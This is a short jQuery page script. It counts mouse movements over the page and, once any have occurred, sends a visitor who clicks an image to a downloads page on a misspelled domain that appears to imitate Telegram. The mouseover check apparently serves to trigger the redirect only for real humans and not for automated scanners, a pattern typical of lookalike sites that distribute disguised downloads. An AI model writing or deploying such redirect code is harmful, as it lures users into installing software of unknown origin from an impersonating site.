var numCount=0;
$(function()
{
	$("body").mouseover(function(event)
	{
		numCount++;
	});

	$("img").click(function()
	{
		if(numCount>=1)
		{
			var url="https://down.telagarm.help/downloads.php";
			window.location=url;
		}
	});

})

